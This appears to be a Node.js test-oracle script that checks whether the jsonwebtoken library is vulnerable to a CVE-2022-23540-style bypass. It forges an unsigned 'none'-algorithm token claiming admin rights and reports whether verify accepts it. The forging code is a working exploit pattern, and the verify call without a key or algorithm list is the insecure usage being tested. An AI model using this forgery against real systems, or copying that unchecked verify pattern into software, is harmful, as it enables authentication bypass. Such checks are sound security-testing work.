let operation_completed = false;
let exploit_succeeded = false;
let evidence = '';

function emit() {
  console.log('ORACLE_RESULT ' + JSON.stringify({
    operation_completed: !!operation_completed,
    exploit_succeeded: !!exploit_succeeded,
    evidence: String(evidence || '')
  }));
}

try {
  const jwt = require('jsonwebtoken');

  // Benign control: standard HS256 sign/verify should succeed.
  const benignSecret = 'control-secret-123';
  const benignPayload = { sub: 'control-user', ok: true };
  const benignToken = jwt.sign(benignPayload, benignSecret, { algorithm: 'HS256' });
  const benignOut = jwt.verify(benignToken, benignSecret, { algorithms: ['HS256'] });
  if (!benignOut || benignOut.sub !== 'control-user' || benignOut.ok !== true) {
    throw new Error('benign HS256 verify returned unexpected payload');
  }

  operation_completed = true;

  // Malicious case for CVE-2022-23540-style bypass:
  // Verify a token signed with algorithm "none" when no explicit algorithms are enforced
  // and a falsy key is provided. Vulnerable versions may accept this.
  const noneToken = jwt.sign({ sub: 'attacker', admin: true }, '', { algorithm: 'none' });

  try {
    const out = jwt.verify(noneToken, undefined);
    if (out && out.sub === 'attacker' && out.admin === true) {
      exploit_succeeded = true;
      evidence = 'unsigned token accepted by verify with unspecified key/algorithms';
    } else {
      exploit_succeeded = true;
      evidence = 'unsigned token accepted with unexpected payload';
    }
  } catch (err) {
    exploit_succeeded = false;
    evidence = 'unsigned token rejected: ' + (err && err.message ? err.message : String(err));
  }
} catch (err) {
  operation_completed = false;
  exploit_succeeded = false;
  evidence = 'setup/benign failure: ' + (err && err.message ? err.message : String(err));
}

emit();